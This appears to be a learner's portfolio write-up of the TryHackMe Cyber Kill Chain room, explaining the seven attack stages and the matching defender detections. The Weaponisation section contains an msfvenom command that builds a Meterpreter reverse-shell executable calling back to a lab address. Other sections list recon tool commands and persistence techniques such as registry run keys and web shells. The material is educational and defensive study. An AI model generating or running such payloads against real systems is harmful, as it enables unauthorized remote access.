# TryHackMe — Cyber Kill Chain

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-Attack%20Lifecycle-orange)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Room | Cyber Kill Chain |
| URL | tryhackme.com/room/cyberkillchain |
| Path | Jr Penetration Tester → Penetration Testing Foundations |
| Tasks Completed | Task 1 — Task 9 (all, 100%) |
| Date Completed | June 2026 |

---

## Tasks Completed

| Task | Topic | Status |
|------|-------|--------|
| Task 1 | Introduction | ✅ Done |
| Task 2 | Reconnaissance | ✅ Done |
| Task 3 | Weaponisation | ✅ Done |
| Task 4 | Delivery | ✅ Done |
| Task 5 | Exploitation | ✅ Done |
| Task 6 | Installation | ✅ Done |
| Task 7 | Command and Control (C2) | ✅ Done |
| Task 8 | Actions on Objectives | ✅ Done |
| Task 9 | Conclusion | ✅ Done |

---

## What is the Cyber Kill Chain?

The Cyber Kill Chain is a 7-stage model developed by Lockheed Martin that describes how a cyberattack unfolds from start to finish.

**Why it matters:**
- For **attackers (pentesters):** A checklist of every phase needed to complete a successful attack
- For **defenders (SOC analysts):** If you can detect and stop an attacker at any stage, you break the chain and prevent the attack from reaching its objective

**Key insight:** Breaking the chain at any point = attack fails. Defenders do not need to stop every stage — stopping one is enough.

---

## The 7 Stages

```
1. Reconnaissance  →  2. Weaponisation  →  3. Delivery  →  4. Exploitation
        ↓
5. Installation  →  6. Command & Control  →  7. Actions on Objectives
```

---

## Stage 1 — Reconnaissance

**What:** Gathering information about the target before any attack begins.

**Two types:**

| Type | Description | Examples |
|------|-------------|---------|
| **Passive recon** | Gathering info without touching target systems | WHOIS, Google, LinkedIn, Shodan, theHarvester |
| **Active recon** | Directly interacting with target systems | Nmap scans, banner grabbing, web crawling |

**What attackers look for:**
- Employee names and email formats (LinkedIn, company website)
- IP ranges, domains, subdomains
- Technologies in use (job listings reveal tech stack)
- Open ports and services
- Leaked credentials (Have I Been Pwned, Pastebin)

**Tools used:**
```bash
theHarvester -d target.com -b google    # Email and subdomain harvest
shodan search "Apache target.com"       # Exposed services
subfinder -d target.com                 # Subdomain enumeration
whois target.com                        # Domain registration info
```

**Defender detection:** Unusual DNS queries, abnormal traffic from recon tools, Shodan queries (difficult to detect passive recon — this is why it is the hardest stage to defend).

---

## Stage 2 — Weaponisation

**What:** Creating the weapon (payload/exploit) that will be used against the target.

The attacker takes the information from reconnaissance and builds an attack tool.

**Examples:**
- Crafting a malicious PDF or Word document with embedded macro
- Packaging an exploit with a Meterpreter payload using msfvenom
- Creating a phishing email template mimicking the target company's style
- Developing a custom exploit for a discovered CVE

**msfvenom example:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f exe -o payload.exe
```

**Defender detection:** Hard to detect at this stage — the weapon is being built on the attacker's own infrastructure. Focus on the next stages.

---

## Stage 3 — Delivery

**What:** Getting the weapon to the target.

**Common delivery methods:**

| Method | How it works | Example |
|--------|-------------|---------|
| **Phishing email** | Malicious attachment or link sent via email | PDF with macro, link to fake login page |
| **Spear phishing** | Targeted phishing using personal info from recon | Email pretending to be victim's manager |
| **Watering hole** | Compromise a website the target frequently visits | Inject exploit kit into industry news site |
| **USB drop** | Leave infected USB in target's car park or lobby | Autorun payload executes on plug-in |
| **Supply chain** | Compromise software the target uses | Malicious update to legitimate software |

**Defender detection:** Email filtering, sandboxing attachments, URL reputation checking, user awareness training. Phishing is the most common delivery method in real breaches.

---

## Stage 4 — Exploitation

**What:** The weapon executes and a vulnerability is triggered.

This is the moment the attacker gains initial access.

**Types of exploitation:**
- User-triggered: victim opens malicious attachment → macro runs → payload executes
- Server-side: attacker sends exploit directly to vulnerable service (e.g. EternalBlue to port 445)
- Client-side: malicious link opens in browser → browser vulnerability exploited

**Common exploitation targets:**
```
Unpatched services     → EternalBlue (MS17-010), Log4Shell
Phishing attachment    → Malicious macro in Word/Excel
Browser vulnerability  → Drive-by download
Credential theft       → Brute force, credential stuffing
```

**Defender detection:** EDR/AV alerts on payload execution, unusual process spawning (Word spawning cmd.exe is a red flag), SIEM alerts on exploit signatures.

---

## Stage 5 — Installation

**What:** Attacker installs a backdoor to maintain persistent access even if the system reboots.

**Common persistence mechanisms:**

| Technique | How it works |
|-----------|-------------|
| **Registry run keys** | Malware added to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| **Scheduled tasks** | Malware runs on schedule via Task Scheduler |
| **Startup folder** | Malicious file placed in Windows Startup folder |
| **Cron jobs (Linux)** | Malicious entry added to crontab |
| **Web shell** | PHP/ASPX file uploaded to web server — persistent access via HTTP |
| **New admin user** | Attacker creates a backdoor account |

**Why this stage matters for defenders:** If you detect and remove malware but don't find the persistence mechanism, the attacker returns after the next reboot.

**Defender detection:** File integrity monitoring (Wazuh, Tripwire), monitoring registry changes, SIEM alerts on new scheduled tasks or new user creation.

---

## Stage 6 — Command and Control (C2)

**What:** Attacker establishes a communication channel to remotely control the compromised system.

**How C2 works:**
```
Compromised machine → outbound connection → C2 server (attacker controls)
                   ← commands sent back ←
```

**Common C2 channels:**

| Channel | Why attackers use it |
|---------|---------------------|
| **HTTP/HTTPS** | Blends into normal web traffic — hard to block |
| **DNS** | DNS queries allowed almost everywhere — very stealthy |
| **ICMP** | Unusual but hard to inspect |
| **Social media / cloud services** | C2 over Twitter DMs or Google Docs — bypasses traditional filtering |

**Popular C2 frameworks:**
- Cobalt Strike (commercial, used by both pentesters and APTs)
- Metasploit (Meterpreter reverse shell)
- Sliver (open-source alternative)
- Covenant (.NET based)

**Defender detection:** Unusual outbound connections, beaconing behaviour (regular intervals of outbound traffic), DNS queries to unknown domains, SIEM alerts on unusual protocols.

---

## Stage 7 — Actions on Objectives

**What:** The attacker achieves their final goal — the reason the attack happened.

**Common objectives:**

| Objective | Example |
|-----------|---------|
| **Data exfiltration** | Steal customer PII, intellectual property, financial data |
| **Ransomware deployment** | Encrypt all files and demand payment |
| **Lateral movement** | Pivot to other systems on the network |
| **Privilege escalation** | Gain domain admin rights |
| **Destruction** | Delete backups, wipe systems |
| **Espionage** | Monitor communications, keylog executives |

**In a pentest:** This stage is where you capture the flag, access the target data, or demonstrate the impact of a full compromise to the client.

---

## Kill Chain from a Defender's Perspective

| Stage | What defenders should do |
|-------|-------------------------|
| Reconnaissance | Minimise public footprint, monitor for unusual OSINT activity |
| Weaponisation | Threat intel feeds — know what exploits are being weaponised |
| Delivery | Email filtering, sandbox, user training |
| Exploitation | Patch management, EDR, vulnerability scanning |
| Installation | File integrity monitoring, application whitelisting |
| C2 | Network monitoring, DNS filtering, SIEM alerting on beaconing |
| Actions | Data loss prevention (DLP), backup integrity, incident response plan |

**SOC analyst focus:** Stages 4–7 are where SOC teams spend most of their time — detecting exploitation, identifying persistence, hunting C2 traffic, and responding to active objectives.

---

## Key Takeaways

- **The Kill Chain is a shared language** — both attackers and defenders use it. Knowing it makes you useful on both sides of the table
- **Breaking any link breaks the chain** — defenders do not need perfect detection everywhere, just reliable detection at any one stage
- **C2 traffic is the most detectable** — beaconing behaviour (regular outbound connections at fixed intervals) is one of the strongest indicators of compromise
- **Persistence hunting is often missed** — removing malware without removing persistence means the attacker returns after the next reboot
- **Stage 7 is the business impact** — clients care about what data was at risk, not which CVE was used. Always frame findings in terms of what an attacker could have done at Stage 7

---

## How This Maps to My Learning

| Kill Chain Stage | What I'm learning |
|-----------------|-------------------|
| Reconnaissance | theHarvester, Shodan, subfinder (tool weeks 6–9) |
| Weaponisation | msfvenom, payload generation (Metasploit room) |
| Delivery | Social engineering concepts (Jr Pentester path) |
| Exploitation | PortSwigger labs, TryHackMe machines, Metasploit |
| Installation | LinPEAS/WinPEAS, post-exploitation (HTB machines) |
| C2 | Meterpreter sessions (Metasploit: The Basics room) |
| Actions on Objectives | CTF flags, data access demonstrations |

---

## Resources

- [Lockheed Martin — Original Kill Chain Paper](https://lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf)
- [MITRE ATT&CK Framework](https://attack.mitre.org/) — more granular than Kill Chain
- [TryHackMe — Cyber Defense path](https://tryhackme.com/path/outline/cyberdefense) — defender-side Kill Chain learning

---

## My Progress

- [x] Dive Into Pentesting
- [x] Cyber Kill Chain ← *this writeup*
- [x] Penetration Testing Frameworks
- [ ] Network Services rooms — coming next

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
